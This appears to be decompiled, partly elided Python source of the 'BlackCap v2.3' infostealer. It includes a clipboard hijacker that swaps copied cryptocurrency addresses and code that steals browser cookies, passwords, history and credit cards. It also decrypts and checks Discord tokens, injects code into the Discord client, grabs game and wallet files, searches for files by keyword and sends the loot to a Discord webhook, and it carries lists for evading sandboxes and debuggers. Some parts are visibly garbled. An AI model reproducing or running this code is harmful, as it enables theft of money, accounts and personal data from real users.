...
class auto_copy_wallet(Functions):
    ...
    def address_swap(self):
        try:
            ...
            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data) and clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash] and (self.address_btc!= 'none'):
                pyperclip.copy(self.address_btc)
                pyperclip.paste()
            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
                pyperclip.copy(self.address_eth)
                pyperclip.paste()
            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data) and self.address_xchain!= 'none' and (clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]):
                pyperclip.copy(self.address_xchain)
                pyperclip.paste()
            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data) and self.address_pchain!= 'none' and (clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]):
                pyperclip.copy(self.address_pchain)
                pyperclip.paste()
            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data) and self.address_cchain!= 'none':
            ...
            if re.search('addr1[a-z0-9]+', clipboard_data):
                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                    ...
                    pyperclip.paste()
            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data) and self.address_dash!= 'none':
                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                    pyperclip.copy(self.address_dash)
                    pyperclip.paste()
            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data) and self.address_monero!= 'none' and (clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]):
...
class first_function_bc(Functions):
    def __init__(self):
        ...
        self.windows_uuid, self.never_wind, self.key_windows_find = (inf[0], inf[1], inf[2])
        ...
        self.chrmrgx = re.compile('(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.regex = regx_net
    ...
    def ping_on_running(self: str) -> str:
        ping1 = {'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png', 'content': '@everyone'}
        ping2 = {'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png', 'content': '@here'}
        if self.pingonrun == 'yes':
            if self.regex_webhook_dsc in self.discord_webhook and (self.pingtype == '@everyone' or self.pingtype == 'everyone'):
    ...
    def extract_try(func):
        """Decorator to safely catch and ignore exceptions"""  # inserted
    ...
    async def init(self):
        ...
        if self.discord_webhook == '' or self.discord_webhook == 'WEBHOOK_HERE':
            self.bc_exit_this()
        self.hide_bc()
        self.remoter_bc_err()
        self.startup_bc()
        ...
        function_list = [self.screentimes, self.system_informations, self.find_bctoken, self.mc_find, self.find_roblox]
        ...
        for name, path in self.browsers.items():
            ...
            self.funcs = [self.steal_cookies2, self.steal_history2, self.steal_passwords2, self.steal_cc2]
                ...
                for __dir in os.listdir(ntpath.abspath(discord)):
                    if re.match('app-(\\d*\\.\\d*)*', __dir):
                        ...
                        for ___dir in os.listdir(modules):
                            if re.match('discord_desktop_core-\\d+', ___dir):
                                inj_path = modules + os.sep + ___dir + '\\discord_desktop_core\\'
                                if ntpath.exists(inj_path):
                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            ...
                                            pass
                                    if self.regex_webhook_dsc in self.discord_webhook:
                                        f = httpx.get(self.find_in_config('bc_injection_url')).text.replace('%WEBHOOK%', self.discord_webhook)
                                    try:
                    ...
                    for filname in os.listdir(path):
                        ...
                        for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.value_dcrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.MasterKey_find(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
    ...
    def steal_cookies2(self, name: str, path: str, profile: str):
        ...
        cursor = conn.cursor()
        with open(os.path.join(self.dir, 'Browsers', 'Browsers Cookies.txt'), 'a', encoding='utf-8') as f:
        ...
        for prof in os.listdir(self.chrmmuserdtt):
            if re.match(self.chrmrgx, prof):
                ...
                for r in cursor.fetchall():
                    ...
                    decrypted_password = self.value_decrypt(encrypted_password, self.chrome_key)
                    if url!= '':
    ...
    def steal_history2(self, name: str, path: str, profile: str):
        ...
        cursor = conn.cursor()
        with open(os.path.join(self.dir, 'Browsers', 'Browsers History.txt'), 'a', encoding='utf-8') as f:
            sites = []
    ...
    def steal_cc2(self, name: str, path: str, profile: str):
        ...
        cursor = conn.cursor()
        with open(os.path.join(self.dir, 'Browsers', 'Browsers CC.txt'), 'a', encoding='utf-8') as f:
    ...
    def natify_matched_tokens(self):
        ...
        for token in self.tokens:
            ...
            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.header_making(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(self.dscap1 + '/billing/payment-sources', headers=self.header_making(token)).text)) > 0)
            f.write(f"{'                 '}{user}\n{'--------------------------------------------------'}\nBilling?: {billing}\nNitro: {has_nitro}\ndisc_badg: {disc_badg}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n")
        f.close()
    ...
    def mc_find(self):
        ...
        files_toget = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
    ...
    def finished_bc(self):
        ...
        self = {'name': 'BlackCap', 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png': [{'name': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png', 'url': 'BlackCap v2.3', 'icon_url': 'https://github.com/KSCHdsc', '\n                                Region:  ': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, {'name': 374276, 'value': f"[BlackCap has Geo Localised this guy]({self.googlemap})", 'inline': f"​{'```fix\n                                IP  ', 'ip': self.ip.replace(' ', ' ') if self.ip else 'N/A'}, '```fix\n                                Computer Name: ': {'name': '​', 'value': f" {' '}", 'inline': False}, 'computer_victim': {'name': ')', 'value': f" {' '}", 'inline': False}, '\n                                Windows Key: ': {'name': '​', 'value': f" {' '}", 'inline':
            pass  # postinserted
...
class NoDebugg(Functions):
    ...
    def __init__(self):
        self.processes = list()
        self.users_blocked = ['WDAGUtilityAccount', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'RGzcBUyrznReg', 'h7dk1xPr', 'Robert', 'Abby', 'Peter Wilson', 'hmarc', 'patex', 'JOHN-PC', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl']
        self.pcname_blocked = ['DESKTOP-CDLNVOQ', 'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'DESKTOP-B0T93D6']
        self.hwid_blocked = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '79AF5279-16CF-4094-9758-F88A616D81B4', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518']
...
def upload(name, tk=''):
    ...
    if name == 'check_spec_bc':
        data = {'content': '', 'embeds': [{'fields': [{'name': 'Interesting files found on user PC:', 'value': tk}], 'author': {'name': 'Black - Cap v2.3', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, 'footer': {'text': 'github.com/KSCHdsc'}, 'color': 374276}], 'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png', 'attachments': []}
    ...
    if 'bc_allpasswords' in name:
        ...
        data = {'content': '', 'embeds': [{'fields': [{'name': 'Passwords Found:', 'value': ra}], 'author': {'name': 'Black - Cap v2.3', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, 'footer': {'text': 'github.com/KSCHdsc'}, 'color': 374276}], 'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png', 'attachments': []}
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
    if 'bc_allcookies' in name:
        ...
        data = {'content': '', 'embeds': [{'fields': [{'name': 'Cookies Found:', 'value': rb}], 'author': {'name': 'Black - Cap v2.3', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, 'footer': {'text': 'github.com/KSCHdsc'}, 'color': 374276}], 'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png', 'attachments': []}
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write('Created by KSCH | https://github.com/KSCHdsc\n\n')
        for line in data:
            if line[0]!= '':
                f.write(f'{line}\n')
NotPSSW = []
...
def Find_Passw(path, arg):
    ...
    if os.stat(pathC).st_size == 0:
        return
    tempfold = temp + 'bc_is_here' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
...
def Get_Bc_Cook(path, arg):
    ...
    for row in data:
        if row[0]!= '':
            ...
            Cookies.append(f'{row[0]}\tTRUE' + '\t\t' + f'/FALSE\t2597573456\t{row[1]}\t{Value_Dcryptage(row[2], master_key)}')
...
def bc_Gather_All():
    ...
    Paths_zipped = [[f'{roaming}/atomic/Local Storage/leveldb', '\"Atomic Wallet.exe\"', 'Wallet'], [f'{roaming}/Exodus/exodus.wallet', 'Exodus.exe', 'Wallet'], ['C:\\Program Files (x86)\\Steam\\config', 'steam.exe', 'Steam'], [f'{roaming}/NationsGlory/Local Storage/leveldb', 'NationsGlory.exe', 'NationsGlory']]
...
def check_spec_bc():
    ...
    key_wordsFiles = ['passw', 'mdp', 'motdepasse', 'mot_de_passe', 'login', 'secret', 'account', 'acount', 'paypal', 'banque', 'metamask', 'wallet', 'crypto', 'exodus', 'discord', '2fa', 'code', 'memo', 'compte', 'token', 'backup', 'seecret']
    wikith = []
